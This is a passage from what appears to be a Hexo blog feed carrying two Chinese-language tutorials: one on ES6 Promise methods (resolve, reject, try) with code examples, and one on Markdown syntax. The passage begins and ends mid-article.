resolve(<span class="string">'foo'</span>))</span><br></pre></td></tr></table></figure><p><code>Promise.resolve</code>方法的参数分成四种情况。</p><p><strong>（1）参数是一个 Promise 实例</strong></p><p>如果参数是 Promise 实例，那么<code>Promise.resolve</code>将不做任何修改、原封不动地返回这个实例。</p><p><strong>（2）参数是一个<code>thenable</code>对象</strong></p><p><code>thenable</code>对象指的是具有<code>then</code>方法的对象，比如下面这个对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Promise.resolve</code>方法会将这个对象转为 Promise 对象，然后就立即执行<code>thenable</code>对象的<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> thenable = &#123;</span><br><span class="line">  then: <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    resolve(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="built_in">Promise</span>.resolve(thenable);</span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);  <span class="comment">// 42</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>thenable</code>对象的<code>then</code>方法执行后，对象<code>p1</code>的状态就变为<code>resolved</code>，从而立即执行最后那个<code>then</code>方法指定的回调函数，输出 42。</p><p><strong>（3）参数不是具有<code>then</code>方法的对象，或根本就不是对象</strong></p><p>如果参数是一个原始值，或者是一个不具有<code>then</code>方法的对象，则<code>Promise.resolve</code>方法返回一个新的 Promise 对象，状态为<code>resolved</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve(<span class="string">'Hello'</span>);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params">s</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hello</span></span><br></pre></td></tr></table></figure><p>上面代码生成一个新的 Promise 对象的实例<code>p</code>。由于字符串<code>Hello</code>不属于异步操作（判断方法是字符串对象不具有 then 方法），返回 Promise 实例的状态从一生成就是<code>resolved</code>，所以回调函数会立即执行。<code>Promise.resolve</code>方法的参数，会同时传给回调函数。</p><p><strong>（4）不带有任何参数</strong></p><p><code>Promise.resolve</code>方法允许调用时不带参数，直接返回一个<code>resolved</code>状态的 Promise 对象。</p><p>所以，如果希望得到一个 Promise 对象，比较方便的方法就是直接调用<code>Promise.resolve</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.resolve();</span><br><span class="line"></span><br><span class="line">p.then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码的变量<code>p</code>就是一个 Promise 对象。</p><p>需要注意的是，立即<code>resolve</code>的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'three'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'two'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'one'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// one</span></span><br><span class="line"><span class="comment">// two</span></span><br><span class="line"><span class="comment">// three</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>setTimeout(fn, 0)</code>在下一轮“事件循环”开始时执行，<code>Promise.resolve()</code>在本轮“事件循环”结束时执行，<code>console.log(&#39;one&#39;)</code>则是立即执行，因此最先输出。</p><h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h2><p><code>Promise.reject(reason)</code>方法也会返回一个新的 Promise 实例，该实例的状态为<code>rejected</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.reject(<span class="string">'出错了'</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">'出错了'</span>))</span><br><span class="line"></span><br><span class="line">p.then(<span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 出错了</span></span><br></pre></td></tr></table></figure><p>上面代码生成一个 Promise 对象的实例<code>p</code>，状态为<code>rejected</code>，回调函数会立即执行。</p><p>注意，<code>Promise.reject()</code>方法的参数，会原封不动地作为<code>reject</code>的理由，变成后续方法的参数。这一点与<code>Promise.resolve</code>方法不一致。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> thenable = &#123;</span><br><span class="line">  then(resolve, reject) &#123;</span><br><span class="line">    reject(<span class="string">'出错了'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.reject(thenable)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e === thenable)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>Promise.reject</code>方法的参数是一个<code>thenable</code>对象，执行以后，后面<code>catch</code>方法的参数不是<code>reject</code>抛出的“出错了”这个字符串，而是<code>thenable</code>对象。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h3><p>我们可以将图片的加载写成一个<code>Promise</code>，一旦加载完成，<code>Promise</code>的状态就发生变化。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Generator-函数与-Promise-的结合"><a href="#Generator-函数与-Promise-的结合" class="headerlink" title="Generator 函数与 Promise 的结合"></a>Generator 函数与 Promise 的结合</h3><p>使用 Generator 函数管理流程，遇到异步操作的时候，通常返回一个<code>Promise</code>对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFoo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    resolve(<span class="string">'foo'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> g = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> foo = <span class="keyword">yield</span> getFoo();</span><br><span class="line">    <span class="built_in">console</span>.log(foo);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params">generator</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> it = generator();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.value.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> go(it.next(value));</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> go(it.throw(error));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  go(it.next());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run(g);</span><br></pre></td></tr></table></figure><p>上面代码的 Generator 函数<code>g</code>之中，有一个异步操作<code>getFoo</code>，它返回的就是一个<code>Promise</code>对象。函数<code>run</code>用来处理这个<code>Promise</code>对象，并调用下一个<code>next</code>方法。</p><h2 id="Promise-try"><a href="#Promise-try" class="headerlink" title="Promise.try()"></a>Promise.try()</h2><p>实际开发中，经常遇到一种情况：不知道或者不想区分，函数<code>f</code>是同步函数还是异步操作，但是想用 Promise 来处理它。因为这样就可以不管<code>f</code>是否包含异步操作，都用<code>then</code>方法指定下一步流程，用<code>catch</code>方法处理<code>f</code>抛出的错误。一般就会采用下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(f)</span><br></pre></td></tr></table></figure><p>上面的写法有一个缺点，就是如果<code>f</code>是同步函数，那么它会在本轮事件循环的末尾执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// next</span></span><br><span class="line"><span class="comment">// now</span></span><br></pre></td></tr></table></figure><p>上面代码中，函数<code>f</code>是同步的，但是用 Promise 包装了以后，就变成异步执行了。</p><p>那么有没有一种方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？回答是可以的，并且还有两种写法。第一种写法是用<code>async</code>函数来写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; f())();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的<code>async</code>函数，因此如果<code>f</code>是同步的，就会得到同步的结果；如果<code>f</code>是异步的，就可以用<code>then</code>指定下一步，就像下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br></pre></td></tr></table></figure><p>需要注意的是，<code>async () =&gt; f()</code>会吃掉<code>f()</code>抛出的错误。所以，如果想捕获错误，要使用<code>promise.catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; f())()</span><br><span class="line">.then(...)</span><br><span class="line">.catch(...)</span><br></pre></td></tr></table></figure><p>第二种写法是使用<code>new Promise()</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line">(</span><br><span class="line">  () =&gt; <span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">    resolve =&gt; resolve(f())</span><br><span class="line">  )</span><br><span class="line">)();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>上面代码也是使用立即执行的匿名函数，执行<code>new Promise()</code>。这种情况下，同步函数也是同步执行的。</p><p>鉴于这是一个很常见的需求，所以现在有一个<a href="https://github.com/ljharb/proposal-promise-try" target="_blank" rel="noopener">提案</a>，提供<code>Promise.try</code>方法替代上面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'now'</span>);</span><br><span class="line"><span class="built_in">Promise</span>.try(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'next'</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>事实上，<code>Promise.try</code>存在已久，Promise 库<a href="http://bluebirdjs.com/docs/api/promise.try.html" target="_blank" rel="noopener"><code>Bluebird</code></a>、<a href="https://github.com/kriskowal/q/wiki/API-Reference#promisefcallargs" target="_blank" rel="noopener"><code>Q</code></a>和<a href="https://github.com/cujojs/when/blob/master/docs/api.md#whentry" target="_blank" rel="noopener"><code>when</code></a>，早就提供了这个方法。</p><p>由于<code>Promise.try</code>为所有操作提供了统一的处理机制，所以如果想用<code>then</code>方法管理流程，最好都用<code>Promise.try</code>包装一下。这样有<a href="http://cryto.net/~joepie91/blog/2016/05/11/what-is-promise-try-and-why-does-it-matter/" target="_blank" rel="noopener">许多好处</a>，其中一点就是可以更好地管理异常。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params">userId</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> user.name;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>database.users.get()</code>返回一个 Promise 对象，如果抛出异步错误，可以用<code>catch</code>方法捕获，就像下面这样写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">.then(...)</span><br><span class="line">.catch(...)</span><br></pre></td></tr></table></figure><p>但是<code>database.users.get()</code>可能还会抛出同步错误（比如数据库连接错误，具体要看实现方法），这时你就不得不用<code>try...catch</code>去捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  database.users.get(&#123;<span class="attr">id</span>: userId&#125;)</span><br><span class="line">  .then(...)</span><br><span class="line">  .catch(...)</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这样的写法就很笨拙了，这时就可以统一用<code>promise.catch()</code>捕获所有同步和异步的错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.try(database.users.get(&#123;<span class="attr">id</span>: userId&#125;))</span><br><span class="line">  .then(...)</span><br><span class="line">  .catch(...)</span><br></pre></td></tr></table></figure><p>事实上，<code>Promise.try</code>就是模拟<code>try</code>代码块，就像<code>promise.catch</code>模拟的是<code>catch</code>代码块。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  ES6 Promise对象讲解及其用法！&lt;br&gt;
    
    </summary>
    
      <category term="javascript" scheme="https://jiuylq.github.io/categories/javascript/"/>
    
    
      <category term="ES6" scheme="https://jiuylq.github.io/tags/ES6/"/>
    
  </entry>
  
  <entry>
    <title>markdown-guide</title>
    <link href="https://jiuylq.github.io/2017/11/05/markdown-guide/"/>
    <id>https://jiuylq.github.io/2017/11/05/markdown-guide/</id>
    <published>2017-11-05T14:41:34.000Z</published>
    <updated>2017-11-05T16:38:01.118Z</updated>
    
    <content type="html"><![CDATA[<p>Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h2><p>Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。这个教程可以让使用 Markdown 的新手快速熟悉语法和快捷键。本文基于 Ghost 的 Markdown 指南，兼容标准版 Markdown 编辑器和 Github Flavored Markdown。</p><p>NOTE: 虽然 Markdown 标记语言不能够实现 HTML 语法上的全部功能，但你可以混合使用 HTML 和 Markdown 语法。此页提供 Markdown 的简单入门指南，而 语法说明 页提供了详细的文档。</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">或</span><br><span class="line">这是一个一级标题</span><br><span class="line">============================</span><br><span class="line">这是一个二级标题</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure><p><em>注：# 和「标题」之间建议保留一个字符的空格，这是最标准的 Markdown 写法。</em></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><blockquote><p>无序列表  </p></blockquote><p>无序列表是使用*,+,-中任意一种来表示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* 文本1</span><br><span class="line">* 文本2</span><br><span class="line">* 文本3</span><br><span class="line">或</span><br><span class="line">+ 文本1</span><br><span class="line">+ 文本2</span><br><span class="line">+ 文本3</span><br><span class="line">或</span><br><span class="line">- 文本1</span><br><span class="line">- 文本2</span><br><span class="line">- 文本3</span><br></pre></td></tr></table></figure></p><blockquote><p>有序列表 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 文本1</span><br><span class="line">2. 文本2</span><br><span class="line">3. 文本3</span><br></pre></td></tr></table></figure><p><em>注：-、1.和文本之间要保留一个字符的空格。</em></p><h3 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h3><blockquote><p>链接</p></blockquote><ul><li>行内式<br>在 Markdown 中，插入链接不需要其他按钮，你只需要使用 <a href="链接地址">显示文本</a> 这样的语法即可，例如：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[title](url &quot;描述&quot;)</span><br><span class="line">[hexo](https://hexo.io)</span><br></pre></td></tr></table></figure><p><a href="https://hexo.io" title="hexo" target="_blank" rel="noopener">hexo</a></p><ul><li>参考式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[title][id]</span><br><span class="line">  标记: [id]: https://www.baidu.com/ &quot;度娘&quot;</span><br><span class="line">  或者: [id]: https://www.baidu.com/ &apos;度娘&apos; (简书不支持)</span><br><span class="line">  或者 [id]: https://www.baidu.com/ (度娘)</span><br></pre></td></tr></table></figure></li></ul><p>[title][121]<br>[121]: <a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a> “度娘”</p><ul><li>隐式链接标记功能<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Baidu][]</span><br><span class="line">  标记可以这样写: [Baidu]: http://baidu.com</span><br></pre></td></tr></table></figure></li></ul><p><a href="http://baidu.com" target="_blank" rel="noopener">Baidu</a></p><ul><li>参考式链接范例:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">I get 10 times more traffic from [Google] [1] than from </span><br><span class="line">     [Yahoo] [2] or [MSN] [3]. </span><br><span class="line">     [1]:  http://google.com/        &quot;Google&quot;</span><br><span class="line">     [2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;</span><br><span class="line">     [3]: http://search.msn.com/    &quot;MSN Search&quot;</span><br><span class="line">     I get 10 times more traffic from [Google][] than from</span><br><span class="line">     [Yahoo][] or [MSN][].</span><br><span class="line">     [google]: http://google.com/        &quot;Google&quot;</span><br><span class="line">     [yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;</span><br><span class="line">     [msn]:    http://search.msn.com/    &quot;MSN Search&quot;</span><br></pre></td></tr></table></figure><ul><li>自动链接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">示例如下: </span><br><span class="line">  &lt;http:\\www.baidu.com&gt;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>图片</p></blockquote><p>在 Markdown 中，插入图片不需要其他按钮，你只需要使用 <img src="图片链接地址" alt> 这样的语法即可，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">![图片Alt](图片地址 “图片Title”)</span><br><span class="line">![title](https://hexo.io/img/a.jpg)</span><br><span class="line">![title](https://hexo.io/img/a.jpg &quot;描述&quot;)</span><br><span class="line">或</span><br><span class="line">![title][1]</span><br><span class="line">[1]: https://hexo.io/img/a.jpg &quot;描述&quot;</span><br></pre></td></tr></table></figure><p><em>注：插入图片的语法和链接的语法很像，只是前面多了一个 ！。</em></p><h3 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h3><blockquote><p>Markdown使用性星号(<em>)和底线(_)作为标记强调字词的符号<br>两端被一个</em>或<em>包围的单词会被转换成斜体<br>两端被两个<code>*</code>或`</em><code>包围的单词会被转换成粗体</code>*`或_的两端不能有空白<br>用什么符号就以什么符号结尾</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例</span><br><span class="line">*斜体*</span><br><span class="line">_斜体_</span><br><span class="line">**粗体**</span><br><span class="line">__粗体__</span><br><span class="line">***加粗斜体***</span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>  <em>斜体</em><br> _斜体_<br> <strong>粗体</strong><br> <strong>粗体</strong><br> <strong><em>加粗斜体</em></strong><br> <del>删除线</del></p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote><p>在我们写作的时候经常需要引用他人的文字，这个时候引用这个格式就很有必要了，在 Markdown 中，你只需要在你希望引用的文字前面加上 &gt; 就好了，例如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; 简单引用1</span><br><span class="line"> &gt; 简单引用2</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 多行引用</span><br><span class="line"> &gt;&gt; 嵌套引用</span><br><span class="line"></span><br><span class="line"> &gt; ## 引用中使用Markdown语法。</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 1.   